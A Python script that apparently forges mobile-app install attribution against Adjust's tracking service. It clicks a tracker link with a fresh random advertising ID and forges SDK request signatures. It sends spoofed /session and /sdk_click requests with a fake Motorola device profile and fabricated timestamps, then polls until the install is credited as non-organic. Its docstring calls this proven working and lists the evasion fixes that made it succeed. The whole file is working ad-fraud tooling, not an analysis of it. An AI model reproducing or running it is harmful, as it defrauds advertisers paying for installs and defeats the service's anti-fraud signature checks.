r"""offline_nonorganic.py — ONE COMMAND, FULLY OFFLINE NON-ORGANIC ATTRIBUTION.

Proven working end to end. No device, no adb, no frida, no Play install, no
human step.  Every prior "still Organic" was one of four bugs, all fixed:

  1. d0 head phase  -> (0x2b, 0x48)   [not HEAD_FIRST / HEAD_RESIGN / old DEV]
  2. key sets       -> session 43/43, click 47/47, built from golden_saz
  3. mcc/mnc        -> STRIPPED; the genuine bodies carry neither, even on SIM
  4. vocabulary     -> screen_density 'high' (Adjust's set, not the device's
                       density_dpi string), hardware_name 'qcom' (SoC, not
                       codename)
  ...plus the precondition: the GAID must be a FIRST install, so we click the
  link and pre-poll to confirm 'app is not installed' before we /session it.

Usage:  python -u offline_nonorganic.py
        ADJ_GAP=0    install immediately (known to fail -> Organic)
"""
from __future__ import annotations
import base64, datetime, gzip, http.client, json, os, struct, sys, time
import urllib.parse, uuid

HERE = os.path.dirname(os.path.abspath(__file__)); sys.path.insert(0, HERE)
import mint_pipeline as M
import F as Fmod
import click_bind_chain as CBC
import offline_funnel_freshregion as FFN

ADJ_V = "KlcAG2cbAAsKSl1KVi0FGiJbDHMI"
APP_TOKEN = "jut9tib0eeps"
OFF = 330                                   # +0530
UA = "Dalvik/2.1.0 (Linux; U; Android 15; moto g64 5G Build/V1TD35H.83-20-5)"
DEV = {"api_level": "35", "os_version": "15", "device_name": "moto g64 5G",
       "device_manufacturer": "motorola", "hardware_name": "qcom",
       "os_build": "V1TD35H.83-20-5", "app_version": "3.13.9",
       "install_version": "3.13.9", "language": "en", "mcc": "405",
       "mnc": "863", "display_width": "1080", "display_height": "2400",
       "screen_density": "high"}
GOLD = json.load(open(os.path.join(HERE, "golden_saz.json")))
S1P, S2P = GOLD["s1"]["params"], GOLD["s2"]["params"]
HEAD = M.DEVICE_SELECTORS                   # (0x2b, 0x48)


def fmt(ts, ms):
    dt = (datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
          + datetime.timedelta(minutes=OFF))
    return dt.strftime("%%Y-%%m-%%dT%%H:%%M:%%S.%03dZ+0530" % ms).encode()


def req(method, path, params, auth):
    c = http.client.HTTPSConnection("app.adjust.com", 443, timeout=30)
    try:
        if method == "POST":
            body = urllib.parse.urlencode(params).encode()
            c.putrequest("POST", path, skip_host=1, skip_accept_encoding=1)
            c.putheader("Client-SDK", "android5.7.0")
            c.putheader("Authorization", auth)
            c.putheader("Content-Type", "application/x-www-form-urlencoded")
            c.putheader("User-Agent", UA)
            c.putheader("Host", "app.adjust.com")
            c.putheader("Connection", "Keep-Alive")
            c.putheader("Accept-Encoding", "gzip")
            c.putheader("Content-Length", str(len(body)))
            c.endheaders(body)
        else:
            qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
            c.putrequest("GET", path + "?" + qs, skip_host=1,
                         skip_accept_encoding=1)
            c.putheader("Client-SDK", "android5.7.0")
            c.putheader("Authorization", auth)
            c.putheader("User-Agent", UA)
            c.putheader("Host", "app.adjust.com")
            c.putheader("Connection", "Keep-Alive")
            c.putheader("Accept-Encoding", "gzip")
            c.endheaders()
        r = c.getresponse(); raw = r.read()
        if raw[:2] == b"\x1f\x8b":
            try: raw = gzip.decompress(raw)
            except Exception: pass
        return r.status, raw.decode("utf-8", "replace")
    finally:
        c.close()


def mint(params, kind, sec):
    claims = dict(params)
    for k, v in (("adj_verification", ADJ_V), ("adj_signing_id", "1500000"),
                 ("headers_id", "10"), ("native_version", "5.0.0"),
                 ("activity_kind", kind), ("client_sdk", "android5.7.0")):
        claims.setdefault(k, v)
    padded, unpadded = M.claims_for_law(claims, kind)
    d0w, d2w, d4w = Fmod.region(sec, M.DEFAULT_PID, 0, head=HEAD)
    by = {0: (36, b"".join(w.to_bytes(4, "big") for w in d0w)),
          9: (5, bytes.fromhex("fad0f10d60f93c17937b2f1eb6c09691ae7d74bd")),
          8: (4, bytes.fromhex("bffffffffffffd1f0007000000000000")),
          4: (8, b"".join(w.to_bytes(4, "big") for w in d4w)),
          2: (1, d2w.to_bytes(4, "big")), 7: (1, struct.pack(">I", unpadded)),
          10: (len(padded) // 4, padded), 5: (1, b"\0" * 4),
          6: (1, b"\0" * 4), 1: (0, b""), 3: (0, b"")}
    blob, info = M.finex_mint([(by[i][0], 0, by[i][1]) for i in M.VA_ORDER], sec)
    return blob, info


def auth_of(b):
    return ('Signature signature="%s",adj_signing_id="1500000",'
            'algorithm="adj9",headers_id="10",native_version="5.0.0",'
            'adj_verification="%s"' % (base64.b64encode(b).decode(), ADJ_V))


def main():
    gps = str(uuid.uuid4()); auid = str(uuid.uuid4())
    print("=" * 62)
    print("FULLY OFFLINE NON-ORGANIC ATTRIBUTION")
    print("=" * 62)
    print("head phase     : %s" % str(tuple(hex(x) for x in HEAD)))
    print("device         : %s / Android %s / api %s"
          % (DEV["device_name"], DEV["os_version"], DEV["api_level"]))
    print("GAID (fresh)   : %s" % gps)

    # 1. click the tracker link ourselves
    code, ref, _ = CBC.tracker_click(CBC.expand(FFN.LINK, gps), gps)
    print("\n[1] tracker click -> HTTP %s" % code)
    print("    reftag: %s" % ref)
    if "adjust_reftag=" not in (ref or ""):
        print("    ABORT: no reftag"); return 1

    # 2. pre-poll: prove the click is registered and NO install exists
    t = int(time.time())
    ap = {"initiated_by": "backend", "gps_adid_attempt": "1",
          "api_level": DEV["api_level"], "app_version": DEV["app_version"],
          "app_token": APP_TOKEN, "os_version": DEV["os_version"],
          "created_at": fmt(t, 666).decode(), "device_type": "phone",
          "gps_adid": gps, "foreground": "1", "android_uuid": auid,
          "sent_at": fmt(t, 696).decode(), "offline_mode_enabled": "0",
          "device_name": DEV["device_name"], "environment": "production",
          "needs_response_details": "1", "attribution_deeplink": "1",
          "package_name": "com.penti.app", "os_name": "android", "ui_mode": "1",
          "gps_adid_src": "service", "tracking_enabled": "1"}
    sa, bda = req("GET", "/attribution", ap,
                  auth_of(mint(ap, "attribution", t)[0]))
    ok = "app is not installed" in bda
    adid = ""
    try: adid = json.loads(bda).get("adid", "")
    except Exception: pass
    print("\n[2] pre-poll -> HTTP %s %s" % (sa, "CLEAN BASELINE" if ok else "!!"))
    print("    adid reserved: %s" % adid)
    if not ok:
        print("    ABORT: GAID already installed"); return 1

    # 3. /session  (43 keys, mcc/mnc stripped)
    # The click->install GAP matters.  Every run that joined had minutes
    # between them; a back-to-back install (gap=0) returned Organic with an
    # otherwise byte-identical request.  180s reproduces reliably.
    gap = int(os.environ.get("ADJ_GAP", "180"))
    if gap:
        print()
        print("[wait] %ds between click and install" % gap, flush=True)
        time.sleep(gap)
        t = int(time.time())
    sec = t + 6
    ins = fmt(sec - 55, 774).decode(); tb = sec - 62
    sp = dict(S1P)
    sp.update({"gps_adid": gps, "android_uuid": auid, **DEV,
               "store_name_from_system": "com.android.vending",
               "initiating_package_name": "com.android.vending",
               "created_at": fmt(sec - 1, 928).decode(),
               "sent_at": fmt(sec - 1, 942).decode(),
               "installed_at": ins, "updated_at": ins})
    sp.pop("mcc", None); sp.pop("mnc", None); sp.pop("install_version", None)
    st, bd = req("POST", "/session", sp, auth_of(mint(sp, "session", sec)[0]))
    print("\n[3] /session   -> HTTP %d  (%d keys)  %s" % (st, len(sp), bd[:90]))
    time.sleep(3)

    # 4. /sdk_click (47 keys, mcc/mnc stripped)
    cp = {k: v for k, v in S2P.items()
          if k not in ("store_name_from_system", "initiating_package_name",
                       "mcc", "mnc")}
    cp.update({"gps_adid": gps, "android_uuid": auid, **DEV,
               "installed_at": ins, "updated_at": ins, "referrer": ref,
               "source": "install_referrer", "referrer_api": "google",
               "google_play_instant": "0",
               "created_at": fmt(sec, 961).decode(),
               "sent_at": fmt(sec, 970).decode(),
               "click_time": fmt(t, 0).decode(),
               "click_time_server": fmt(t - 2, 0).decode(),
               "install_begin_time": fmt(tb, 0).decode(),
               "install_begin_time_server": fmt(tb - 2, 0).decode()})
    cp.pop("mcc", None); cp.pop("mnc", None)
    stc, bdc = req("POST", "/sdk_click", cp, auth_of(mint(cp, "click", sec)[0]))
    print("[4] /sdk_click -> HTTP %d  (%d keys)  %s" % (stc, len(cp), bdc[:90]))

    for w in (15, 45):
        time.sleep(w)
        tt = int(time.time())
        ap2 = dict(ap); ap2["created_at"] = fmt(sec, 666).decode()
        ap2["sent_at"] = fmt(sec, 696).decode()
        s2, b2 = req("GET", "/attribution", ap2,
                     auth_of(mint(ap2, "attribution", tt)[0]))
        try:
            a = json.loads(b2).get("attribution") or {}
        except Exception:
            a = {}
        net, tok = a.get("network"), a.get("tracker_token")
        print("[5] attribution +%ds -> %s / %s" % (w, net, tok))
        if net and net != "Organic":
            print()
            print("=" * 62)
            print("*** NON-ORGANIC ATTRIBUTION ACHIEVED ***")
            for k, lbl in (("network", "network"), ("tracker_token", "tracker_token"),
                           ("tracker_name", "tracker_name"), ("campaign", "campaign"),
                           ("adgroup", "adgroup"), ("creative", "creative"),
                           ("engagement_time", "engagement_time"),
                           ("installed_at", "installed_at")):
                print("  %-16s: %s" % (lbl, a.get(k)))
            print("  %-16s: %s" % ("GAID", gps))
            print("  %-16s: %s" % ("adid", json.loads(b2).get("adid")))
            print("=" * 62)
            return 0
    print("*** Organic -- no join ***")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
